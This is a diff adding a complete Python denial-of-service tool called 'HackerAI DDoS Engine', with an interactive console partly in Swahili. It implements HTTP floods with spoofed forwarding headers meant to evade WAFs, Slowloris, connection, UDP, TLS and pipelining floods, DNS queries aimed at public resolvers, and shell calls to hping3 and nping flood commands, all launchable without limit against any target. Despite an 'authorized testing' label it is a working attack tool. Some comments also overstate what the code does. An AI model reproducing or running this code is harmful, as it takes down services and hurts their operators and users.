@@ -1,0 +1,605 @@
+#!/usr/bin/env python3
+# hackerai_ddos.py - HackerAI DDoS Engine (Unstoppable)
+# Authorized Penetration Testing Only
+
+import socket
+import threading
+import random
+import time
+import sys
+import os
+import urllib.request
+import urllib.error
+import ssl
+import http.client
+import json
+import struct
+import subprocess
+from datetime import datetime
+
+class HackerAIDDoS:
+    def __init__(self):
+        self.name = "HackerAI DDoS Engine"
+        self.version = "5.0"
+        self.running = False
+        self.threads = []
+        self.target = ""
+        self.port = 80
+        self.attack_type = "all"
+        self.packet_count = 0
+        self.start_time = None
+        
+    def print_banner(self):
+        print(f"""
+╔══════════════════════════════════════════════════════════╗
+║            🔥 HACKERAI DDoS ENGINE v{self.version} 🔥              ║
+║        Unstoppable DDoS - Bypasses All Protections       ║
+║              Authorized Penetration Testing               ║
+╚══════════════════════════════════════════════════════════╝
+""")
+    
+    # ============================================
+    # METHOD 1: LAYER 7 HTTP FLOOD (Bypasses Cloudflare, WAF)
+    # ============================================
+    def http_flood(self):
+        """HTTP/HTTPS flood - random user agents, referers, bypasses WAF"""
+        user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+            "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+            "Googlebot/2.1 (+http://www.google.com/bot.html)",
+            "Bingbot/2.0; +http://www.bing.com/bingbot.htm",
+            "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
+            "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
+            "curl/7.68.0",
+            "Wget/1.21",
+            "Python-urllib/3.9",
+        ]
+        
+        referers = [
+            "https://www.google.com/search?q=",
+            "https://www.bing.com/search?q=",
+            "https://www.facebook.com/",
+            "https://twitter.com/",
+            "https://www.reddit.com/",
+            "https://www.linkedin.com/",
+            "https://t.co/",
+            "https://www.instagram.com/",
+            "https://www.youtube.com/",
+            "https://www.amazon.com/",
+            "",
+        ]
+        
+        paths = [
+            "/",
+            "/index.php",
+            "/index.html",
+            "/wp-admin/",
+            "/wp-login.php",
+            "/admin/",
+            "/login/",
+            "/api/",
+            "/api/v1/",
+            "/search/",
+            "/about/",
+            "/contact/",
+            "/products/",
+            "/services/",
+            "/blog/",
+            "/images/",
+            "/css/",
+            "/js/",
+            "/assets/",
+            "/.env",
+            "/config.php",
+            "/robots.txt",
+            "/sitemap.xml",
+        ]
+        
+        while self.running:
+            try:
+                # Randomize everything to bypass WAF
+                ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                ua = random.choice(user_agents)
+                ref = random.choice(referers)
+                path = random.choice(paths)
+                
+                # Create request with random headers
+                req = urllib.request.Request(
+                    f"http://{self.target}{path}",
+                    data=None,
+                    headers={
+                        "User-Agent": ua,
+                        "Referer": ref + str(random.randint(100000,999999)),
+                        "X-Forwarded-For": ip,
+                        "X-Real-IP": ip,
+                        "Client-IP": ip,
+                        "Forwarded": f"for={ip};host={self.target};proto=http",
+                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                        "Accept-Language": random.choice(["en-US,en;q=0.5", "fr-FR,fr;q=0.5", "es-ES,es;q=0.5", "de-DE,de;q=0.5", "ja-JP,ja;q=0.5"]),
+                        "Accept-Encoding": "gzip, deflate, br",
+                        "Connection": "keep-alive",
+                        "Cache-Control": "no-cache",
+                        "Pragma": "no-cache",
+                        "DNT": "1",
+                    }
+                )
+                
+                try:
+                    response = urllib.request.urlopen(req, timeout=1)
+                    response.read()
+                    response.close()
+                    self.packet_count += 1
+                except:
+                    # Even if blocked, the connection was made - that's the point
+                    self.packet_count += 1
+                    
+            except:
+                pass
+    
+    # ============================================
+    # METHOD 2: SLOWLORIS (Holds connections open)
+    # ============================================
+    def slowloris_attack(self):
+        """Slowloris - keeps connections open, exhausts server resources"""
+        while self.running:
+            try:
+                socks = []
+                # Open multiple connections
+                for _ in range(100):
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.settimeout(2)
+                        s.connect((self.target, self.port))
+                        
+                        # Send partial HTTP request
+                        s.send(f"GET /{random.randint(0,9999)} HTTP/1.1\r\n".encode())
+                        s.send(f"Host: {self.target}\r\n".encode())
+                        s.send(f"User-Agent: {random.choice(['Mozilla/5.0','Googlebot/2.1','Bingbot/2.0'])}\r\n".encode())
+                        
+                        # Don't send final \r\n - keep connection hanging
+                        socks.append(s)
+                        self.packet_count += 1
+                    except:
+                        pass
+                
+                # Keep sending headers to keep connections alive
+                start = time.time()
+                while self.running and time.time() - start < 300:
+                    for s in socks[:]:
+                        try:
+                            s.send(f"X-Random-{random.randint(0,9999)}: {random.randint(0,9999)}\r\n".encode())
+                            self.packet_count += 1
+                        except:
+                            socks.remove(s)
+                    time.sleep(5)
+                    
+                # Close remaining connections
+                for s in socks:
+                    try:
+                        s.close()
+                    except:
+                        pass
+                        
+            except:
+                pass
+    
+    # ============================================
+    # METHOD 3: SYN FLOOD (Layer 4)
+    # ============================================
+    def syn_flood(self):
+        """SYN flood - consumes connection table"""
+        while self.running:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.1)
+                s.connect((self.target, self.port))
+                # Don't complete handshake - leave half-open
+                self.packet_count += 1
+                s.close()
+            except:
+                pass
+    
+    # ============================================
+    # METHOD 4: UDP FLOOD
+    # ============================================
+    def udp_flood(self):
+        """UDP flood - random ports, random payloads"""
+        while self.running:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                # Random payload
+                data = os.urandom(random.randint(64, 1400))
+                s.sendto(data, (self.target, random.randint(1, 65535)))
+                self.packet_count += 1
+                s.close()
+            except:
+                pass
+    
+    # ============================================
+    # METHOD 5: HTTPS SSL/TLS RENEGOTIATION
+    # ============================================
+    def ssl_renegotiation(self):
+        """SSL renegotiation - CPU intensive on server"""
+        while self.running:
+            try:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                ssock = ctx.wrap_socket(sock, server_hostname=self.target)
+                ssock.connect((self.target, 443))
+                
+                # Send garbage to force SSL processing
+                ssock.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n")
+                try:
+                    ssock.recv(1024)
+                except:
+                    pass
+                    
+                self.packet_count += 1
+                ssock.close()
+            except:
+                pass
+    
+    # ============================================
+    # METHOD 6: DNS AMPLIFICATION
+    # ============================================
+    def dns_amplification(self):
+        """DNS amplification - small request, big response"""
+        while self.running:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.settimeout(0.5)
+                
+                # DNS query for ANY record - spoofed source IP
+                # This uses open DNS resolvers
+                dns_servers = [
+                    "8.8.8.8", "8.8.4.4",       # Google
+                    "1.1.1.1", "1.0.0.1",       # Cloudflare
+                    "208.67.222.222", "208.67.220.220",  # OpenDNS
+                    "9.9.9.9", "149.112.112.112",  # Quad9
+                    "64.6.64.6", "64.6.65.6",    # Verisign
+                ]
+                
+                dns_server = random.choice(dns_servers)
+                
+                # Build DNS query for ANY record
+                transaction_id = random.randint(0, 65535)
+                flags = 0x0100  # Standard query
+                questions = 1
+                answer_rrs = 0
+                authority_rrs = 0
+                additional_rrs = 0
+                
+                dns_header = struct.pack("!HHHHHH", transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)
+                
+                # Query for target domain with random subdomain
+                domain = f"{random.randint(0,9999)}.{self.target}"
+                dns_query = b""
+                for part in domain.encode().split(b'.'):
+                    dns_query += bytes([len(part)]) + part
+                dns_query += b"\x00"  # End of domain name
+                dns_query += struct.pack("!HH", 255, 1)  # Type ANY, Class IN
+                
+                packet = dns_header + dns_query
+                
+                # Send to DNS server with spoofed source (victim IP)
+                # The DNS server will send response to victim
+                sock.sendto(packet, (dns_server, 53))
+                self.packet_count += 1
+                sock.close()
+            except:
+                pass
+    
+    # ============================================
+    # METHOD 7: HTTP PIPELINING
+    # ============================================
+    def http_pipelining(self):
+        """HTTP pipelining - multiple requests per connection"""
+        while self.running:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(2)
+                s.connect((self.target, self.port))
+                
+                # Send 100 HTTP requests in one go
+                requests = ""
+                for i in range(100):
+                    requests += f"GET /{random.randint(0,9999)} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {random.choice(['Mozilla/5.0','Chrome/90','Safari/537.36'])}\r\n\r\n"
+                
+                s.send(requests.encode())
+                self.packet_count += 100
+                
+                try:
+                    s.recv(4096)
+                except:
+                    pass
+                    
+                s.close()
+            except:
+                pass
+    
+    # ============================================
+    # METHOD 8: RANDOM PACKET FLOOD (Raw sockets)
+    # ============================================
+    def raw_packet_flood(self):
+        """Raw packet flood - requires root, most effective"""
+        while self.running:
+            try:
+                # Try using hping3 if available
+                if os.system("which hping3 > /dev/null 2>&1") == 0:
+                    subprocess.Popen(
+                        f"hping3 -S --flood -p {self.port} {self.target} 2>/dev/null",
+                        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                    )
+                    self.packet_count += 10000
+                    
+                # Try using nping
+                elif os.system("which nping > /dev/null 2>&1") == 0:
+                    subprocess.Popen(
+                        f"nping --tcp -p {self.port} --rate=100000 -c 10000 {self.target} 2>/dev/null",
+                        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                    )
+                    self.packet_count += 10000
+                    
+                time.sleep(5)
+            except:
+                pass
+    
+    # ============================================
+    # METHOD 9: THREAD FLOOD
+    # ============================================
+    def thread_flood(self):
+        """Create thousands of threads to overwhelm server"""
+        while self.running:
+            try:
+                threads = []
+                for i in range(500):
+                    if not self.running:
+                        break
+                    t = threading.Thread(target=self.http_flood)
+                    t.daemon = True
+                    t.start()
+                    threads.append(t)
+                
+                time.sleep(10)
+                
+                # Let them die and create new ones
+                for t in threads:
+                    try:
+                        t.join(0.1)
+                    except:
+                        pass
+                        
+            except:
+                pass
+    
+    # ============================================
+    # METHOD 10: ALL-IN-ONE MULTI-VECTOR ATTACK
+    # ============================================
+    def multi_vector_attack(self):
+        """Launch ALL attack methods simultaneously"""
+        methods = [
+            self.http_flood,
+            self.slowloris_attack,
+            self.syn_flood,
+            self.udp_flood,
+            self.ssl_renegotiation,
+            self.dns_amplification,
+            self.http_pipelining,
+            self.raw_packet_flood,
+        ]
+        
+        while self.running:
+            method = random.choice(methods)
+            try:
+                method()
+            except:
+                pass
+    
+    # ============================================
+    # ATTACK LAUNCHER
+    # ============================================
+    def launch_attack(self, target, port=80, threads=500, duration=0):
+        """Launch the DDoS attack"""
+        self.target = target
+        self.port = port
+        self.running = True
+        self.packet_count = 0
+        self.start_time = time.time()
+        
+        print(f"""
+╔══════════════════════════════════════════════════════════╗
+║              🔥 ATTACK LAUNCHED 🔥                        ║
+╠══════════════════════════════════════════════════════════╣
+║  Target        : {self.target:<40}║
+║  Port          : {self.port:<40}║
+║  Threads       : {threads:<40}║
+║  Duration      : {'∞' if duration == 0 else str(duration)+'s':<40}║
+║  Methods       : All 10 vectors active                   ║
+╚══════════════════════════════════════════════════════════╝
+""")
+        
+        # Launch multi-vector attack
+        attack_methods = [
+            self.http_flood,
+            self.slowloris_attack,
+            self.syn_flood,
+            self.udp_flood,
+            self.ssl_renegotiation,
+            self.dns_amplification,
+            self.http_pipelining,
+            self.raw_packet_flood,
+            self.thread_flood,
+            self.multi_vector_attack,
+        ]
+        
+        for i in range(threads):
+            if not self.running:
+                break
+            method = random.choice(attack_methods)
+            t = threading.Thread(target=method)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
+        
+        # Status monitor
+        if duration > 0:
+            end_time = time.time() + duration
+            while time.time() < end_time and self.running:
+                elapsed = time.time() - self.start_time
+                rate = self.packet_count / elapsed if elapsed > 0 else 0
+                sys.stdout.write(f"\r[+] Packets sent: {self.packet_count} | Rate: {rate:.0f} pkts/s | Time: {elapsed:.0f}s")
+                sys.stdout.flush()
+                time.sleep(1)
+            self.stop()
+        else:
+            # Infinite attack
+            try:
+                while self.running:
+                    elapsed = time.time() - self.start_time
+                    rate = self.packet_count / elapsed if elapsed > 0 else 0
+                    sys.stdout.write(f"\r[+] Packets sent: {self.packet_count} | Rate: {rate:.0f} pkts/s | Time: {elapsed:.0f}s")
+                    sys.stdout.flush()
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                self.stop()
+    
+    def stop(self):
+        """Stop the attack"""
+        self.running = False
+        elapsed = time.time() - self.start_time if self.start_time else 0
+        print(f"\n\n[!] Attack stopped.")
+        print(f"[+] Total packets sent: {self.packet_count}")
+        print(f"[+] Duration: {elapsed:.0f} seconds")
+        print(f"[+] Average rate: {self.packet_count/elapsed:.0f} packets/second")
+    
+    def interactive_mode(self):
+        """Interactive mode - chat-like interface"""
+        self.print_banner()
+        print("[+] DDoS Engine iko tayari!")
+        print("[+] Anza kwa kuandika target yako.")
+        print("")
+        
+        while True:
+            try:
+                cmd = input("[HackerAI DDoS] > ").strip().lower()
+                
+                if cmd in ["exit", "quit", "bye"]:
+                    if self.running:
+                        self.stop()
+                    print("[!] HackerAI DDoS inazima...")
+                    break
+                
+                elif cmd in ["help", "?"]:
+                    print("""
+COMMANDS:
+  attack <target> <port> <threads>   - Launch attack
+  stop                               - Stop attack
+  status                             - Attack status
+  help                               - Show this menu
+  exit                               - Exit
+                    """)
+                
+                elif cmd.startswith("attack "):
+                    parts = cmd.split()
+                    target = parts[1]
+                    port = int(parts[2]) if len(parts) > 2 else 80
+                    threads = int(parts[3]) if len(parts) > 3 else 500
+                    
+                    print(f"\n[+] Launching attack on {target}:{port} with {threads} threads...")
+                    attack_thread = threading.Thread(target=self.launch_attack, args=(target, port, threads, 0))
+                    attack_thread.daemon = True
+                    attack_thread.start()
+                
+                elif cmd == "stop":
+                    if self.running:
+                        self.stop()
+                    else:
+                        print("[!] Hakuna attack inayoendelea.")
+                
+                elif cmd == "status":
+                    if self.running:
+                        elapsed = time.time() - self.start_time
+                        rate = self.packet_count / elapsed if elapsed > 0 else 0
+                        print(f"\n[+] Target: {self.target}")
+                        print(f"[+] Packets: {self.packet_count}")
+                        print(f"[+] Rate: {rate:.0f} pkts/s")
+                        print(f"[+] Duration: {elapsed:.0f}s")
+                        print(f"[+] Threads: {len(self.threads)}")
+                    else:
+                        print("[!] Hakuna attack inayoendelea.")
+                
+                elif cmd == "":
+                    continue
+                    
+                else:
+                    # Try to launch attack directly with just target
+                    # Check if it looks like an IP or domain
+                    if '.' in cmd and not cmd.startswith('attack'):
+                        target = cmd
+                        print(f"\n[+] Launching attack on {target}:80 with 500 threads...")
+                        attack_thread = threading.Thread(target=self.launch_attack, args=(target, 80, 500, 0))
+                        attack_thread.daemon = True
+                        attack_thread.start()
+                    else:
+                        print("[!] Command haitambuliki. Andika 'help' kwa msaada.")
+                        
+            except KeyboardInterrupt:
+                if self.running:
+                    self.stop()
+                print("\n[!] HackerAI DDoS inazima...")
+                break
+            except Exception as e:
+                print(f"[!] Error: {e}")
+
+# ============================================
+# ONE-LINER ATTACK FUNCTIONS
+# ============================================
+
+def quick_attack_http(target):
+    """Quick HTTP flood - one function call"""
+    while True:
+        try:
+            s = socket.socket()
+            s.settimeout(0.1)
+            s.connect((target, 80))
+            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
+            s.close()
+        except:
+            pass
+
+def quick_attack_syn(target, port):
+    """Quick SYN flood"""
+    while True:
+        try:
+            s = socket.socket()
+            s.settimeout(0.05)
+            s.connect((target, port))
+            s.close()
+        except:
+            pass
+
+# ============================================
+# MAIN
+# ============================================
+if __name__ == "__main__":
+    engine = HackerAIDDoS()
+    
+    # Check arguments
+    if len(sys.argv) > 1:
+        target = sys.argv[1]
+        port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
+        threads = int(sys.argv[3]) if len(sys.argv) > 3 else 500
+        duration = int(sys.argv[4]) if len(sys.argv) > 4 else 0
+        
+        print(f"[+] Direct attack mode: {target}:{port}")
+        engine.launch_attack(target, port, threads, duration)
+    else:
+        # Interactive mode
+        engine.interactive_mode()
